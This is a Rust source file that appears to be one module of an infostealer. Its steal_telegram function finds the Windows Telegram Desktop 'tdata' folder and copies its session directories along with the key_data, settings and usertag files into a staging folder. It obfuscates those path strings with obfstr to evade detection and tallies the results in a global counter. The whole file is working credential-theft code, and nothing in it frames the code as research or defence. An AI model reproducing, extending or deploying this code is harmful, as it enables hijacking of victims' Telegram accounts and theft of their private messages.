use walkdir::*;

pub fn steal_telegram(path_in: String) -> Option<String>{

    let app_data = std::env::var("APPDATA").ok()?;

    if std::path::Path::new(&format!("{}\\{}", app_data, obfstr::obfstr!("Telegram Desktop\\tdata"))).exists() {
      let _ =  std::fs::create_dir(format!("{path_in}\\{}", obfstr::obfstr!("telegram\\")));

        

        for entry in WalkDir::new(std::path::Path::new(&format!("{}\\{}", app_data, obfstr::obfstr!("Telegram Desktop\\tdata\\")))).max_depth(3).into_iter().filter_map(|f| f.ok()) {

            if entry.file_name().to_str().unwrap().len() != 16 {
                continue;
            }else {
               let _ = copy_directory(entry.path(), format!("{path_in}\\{}\\{}", obfstr::obfstr!("telegram\\tdata"), entry.file_name().to_str().unwrap()));
            }

                       
        }
        for entry in WalkDir::new(std::path::Path::new(&format!("{}\\{}", app_data, obfstr::obfstr!("Telegram Desktop")))).max_depth(3).into_iter().filter_map(|f| f.ok()) {
            let buffer: Vec<u8> = match &entry.metadata() {
                Ok(metadata) => Vec::with_capacity(metadata.len() as usize),
                Err(_) => Vec::new(),
            };
            if buffer.capacity() >= 6291456  {
                continue;
            }   

            drop(buffer);

            if entry.file_name().to_str().unwrap().ends_with("s") && entry.file_name().to_str().unwrap().len() == 17 {
                let _ = std::fs::copy(entry.path(), format!("{path_in}\\{}\\{}", obfstr::obfstr!("telegram"), entry.file_name().to_str().unwrap()));
            }

            if entry.file_name().to_str().unwrap().starts_with(obfstr::obfstr!("usertag")) || entry.file_name().to_str().unwrap().starts_with(obfstr::obfstr!("settings")) || entry.file_name().to_str().unwrap().starts_with(obfstr::obfstr!("key_data")) {
                let _ = std::fs::copy(entry.path(), format!("{path_in}\\{}\\{}", obfstr::obfstr!("telegram"), entry.file_name().to_str().unwrap()));
            }

            unsafe {
                crate::OTHERS += 1;
            }

        }

    }
    return Some("".to_string());

}


use std::path::{Path, PathBuf};
use std::{fs};
pub fn copy_directory<U: AsRef<Path>, V: AsRef<Path>>(
    src: U,
    dst: V,
) -> std::result::Result<(), std::io::Error> {
    let mut stack = Vec::new();
    stack.push(PathBuf::from(src.as_ref()));
 
    let output_root = PathBuf::from(dst.as_ref());
    let input_root = PathBuf::from(src.as_ref()).components().count();
 
    while let Some(working_path) = stack.pop() {
        let src: PathBuf = working_path.components().skip(input_root).collect();
 
        let dest = if src.components().count() == 0 {
            output_root.clone()
        } else {
            output_root.join(&src)
        };
 
        if fs::metadata(&dest).is_err() {
            fs::create_dir_all(&dest)?;
        }
 
        for entry in fs::read_dir(working_path)? {
            let entry = entry?;
 
            if entry.file_type()?.is_dir() {
                stack.push(entry.path());
            } else {
                if let Some(filename) = entry.path().file_name() {
                    fs::copy(&entry.path(), &dest.join(filename))?;
                }
            }
        }
    }
 
    Ok(())
}